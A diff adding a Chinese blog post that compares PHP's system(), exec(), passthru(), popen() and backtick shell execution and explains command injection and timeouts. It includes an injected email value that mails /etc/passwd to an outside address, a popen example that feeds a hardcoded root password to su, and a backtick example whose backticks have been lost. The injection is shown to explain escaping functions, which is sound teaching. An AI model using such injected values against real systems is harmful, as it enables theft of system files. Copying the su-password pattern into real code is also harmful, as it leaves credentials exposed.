@@ -1,0 +1,96 @@
+#+TITLE: PHP中三个调用系统命令的函数system(),exec(),passthru()比较
+#+AUTHOR: Gu Weigang
+#+EMAIL: guweigang@outlook.com
+#+DATE: 2010-08-11 Wed
+#+URI: /blog/2010/08/11/three-system-call-functions-comparision-in-php---system-exec-passthru/
+#+KEYWORDS: 
+#+TAGS: exec, passthru, system
+#+LANGUAGE: zh_CN
+#+OPTIONS: H:3 num:nil toc:nil \n:nil ::t |:t ^:nil -:nil f:t *:t <:t
+#+DESCRIPTION: 
+
+我们知道*php*给我们提供了*[[http://www.phpe.net/manual/function.system.php][system]]()*，*[[http://www.phpe.net/manual/function.exec.php][exec]]()*，*[[http://www.phpe.net/manual/function.passthru.php][passthru]]()*这三个函数来调用外部的命令.
+虽然*这三个命令都能执行linux系统的shell命令，*但是其实他们是有区别的：
+*[[http://www.phpe.net/manual/function.system.php][system]]()* 输出并返回最后一行shell结果。
+*[[http://www.phpe.net/manual/function.exec.php][exec]]()* 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。
+*[[http://www.phpe.net/manual/function.passthru.php][passthru]]()* 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。
+相同点：都可以获得命令执行的状态码
+
+
+
+在PHP中调用外部命令，可以用如下三种方法来实现：
+1） 用PHP提供的专门函数
+PHP提供共了3个专门的执行外部命令的函数：*[[http://www.phpe.net/manual/function.system.php][system]]*()，*[[http://www.phpe.net/manual/function.exec.php][exec]]*()，passthru()。
+
+*[[http://www.phpe.net/manual/function.system.php][system]]*()
+原型：string *[[http://www.phpe.net/manual/function.system.php][system]]* (string command [, int return\_var])
+*[[http://www.phpe.net/manual/function.system.php][system]]*()函数很其它语言中的差不多，它执行给定的命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。
+例子：
+*[[http://www.phpe.net/manual/function.system.php][system]]*("/usr/local/bin/webalizer/webalizer");
+
+*[[http://www.phpe.net/manual/function.exec.php][exec]]*()
+原型：string *[[http://www.phpe.net/manual/function.exec.php][exec]]*(string command [, string array [, int return\_var]])
+*[[http://www.phpe.net/manual/function.exec.php][exec]]*()函数与*[[http://www.phpe.net/manual/function.system.php][system]]*() 类似，也执行给定的命令，但不输出结果，而是返回结果的最后一行。虽然它只返回命令结果的最后一行，但用第二个参数array 可以得到完整的结果，方法是把结果逐行追加到array的结尾处。所以如果array不是空的，在调用之前最好用unset()最它清掉。只有指定了第二 个参数时，才可以用第三个参数，用来取得命令执行的状态码。
+例子：
+*[[http://www.phpe.net/manual/function.exec.php][exec]]*("/bin/ls -l");
+*[[http://www.phpe.net/manual/function.exec.php][exec]]*("/bin/ls -l", $res);
+*[[http://www.phpe.net/manual/function.exec.php][exec]]*("/bin/ls -l", $res, $rc);
+
+passthru()
+原型：void passthru (string command [, int return\_var])
+passthru ()只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上。所以passthru()函数经常用来调用象pbmplus （Unix下的一个处理图片的工具，输出二进制的原始图片的流）这样的程序。同样它也可以得到命令执行的状态码。
+例子：
+header("Content-type: image/gif");
+passthru("./ppmtogif hunte.ppm");
+
+2） 用popen()函数打开进程
+上面的方法只能简单地执行命令，却不能与命令交互。但有些时候必须向命令输入一些东西，如在增加Linux的系统用户时，要调用su来把当前用户换到root才行，而su命令必须要在命令行上输入root的密码。这种情况下，用上面提到的方法显然是不行的。
+popen ()函数打开一个进程管道来执行给定的命令，返回一个文件句柄。既然返回的是一个文件句柄，那么就可以对它读和写了。在PHP3中，对这种句柄只能做单一 的操作模式，要么写，要么读；从PHP4开始，可以同时读和写了。除非这个句柄是以一种模式（读或写）打开的，否则必须调用pclose()函数来关闭 它。
+例子1：
+$fp=popen("/bin/ls -l", "r");
+
+例子2
+/* PHP中如何增加一个系统用户
+下面是一段例程，增加一个名字为james的用户,
+root密码是 verygood。仅供参考
+*/
+$sucommand = "su --login root --command";
+$useradd = "useradd ";
+$rootpasswd = "verygood";
+$user = "james";
+$user\_add = sprintf("%s "%s %s"",$sucommand,$useradd,$user);
+$fp = @popen($user\_add,"w");
+@fputs($fp,$rootpasswd);
+@pclose($fp);
+?>
+3） 用反撇号（`，也就是键盘上ESC键下面的那个，和~在同一个上面）
+这个方法以前没有归入PHP的文档，是作为一个秘技存在的。方法很简单，用两个反撇号把要执行的命令括起来作为一个表达式，这个表达式的值就是命令执行的结果。如：
+$res='/bin/ls -l';
+echo '
+'.$res.'
+';
+
+这个脚本的输出就象：
+hunte.gif
+hunte.ppm
+jpg.htm
+jpg.jpg
+passthru.php
+要考虑些什么？
+要考虑两个问题：安全性和超时。
+先 看安全性。比如，你有一家小型的网上商店，所以可以出售的产品列表放在一个文件中。你编写了一个有表单的HTML文件，让你的用户输入他们的EMAIL地 址，然后把这个产品列表发给他们。假设你没有使用PHP的mail()函数（或者从未听说过），你就调用Linux/Unix系统的mail程序来发送这 个文件。程序就象这样：
+*[[http://www.phpe.net/manual/function.system.php][system]]*("mail $to < products.txt");
+echo "我们的产品目录已经发送到你的信箱：$to";
+
+用这段代码，一般的用户不会产生什么危险，但实际上存在着非常大的安全漏洞。如果有个恶意的用户输入了这样一个EMAIL地址：
+'--bla ; mail someone@domain.com < /etc/passwd ;'
+那么这条命令最终变成：
+'mail --bla ; mail someone@domain.com < /etc/passwd ; < products.txt'
+我相信，无论哪个网络管理人员见到这样的命令，都会吓出一身冷汗来。
+幸 好，PHP为我们提供了两个函数：EscapeShellCmd()和EscapeShellArg()。函数EscapeShellCmd把一个字符串 中所有可能瞒过Shell而去执行另外一个命令的字符转义。这些字符在Shell中是有特殊含义的，象分号（），重定向（>）和从文件读入 （<）等。函数EscapeShellArg是用来处理命令的参数的。它在给定的字符串两边加上单引号，并把字符串中的单引号转义，这样这个字符串 就可以安全地作为命令的参数。
+再来看看超时问题。如果要执行的命令要花费很长的时间，那么应该把这个命令放到系统的后台去运 行。但在默认情况下，象system()等函数要等到这个命令运行完才返回（实际上是要等命令的输出结果），这肯定会引起PHP脚本的超时。解决的办法是 把命令的输出重定向到另外一个文件或流中，如：
+system("/usr/local/bin/order\_proc > /tmp/null &");
+
+转载自[[http://www.zouqingshui.net/][清水的百宝箱]]
+
+
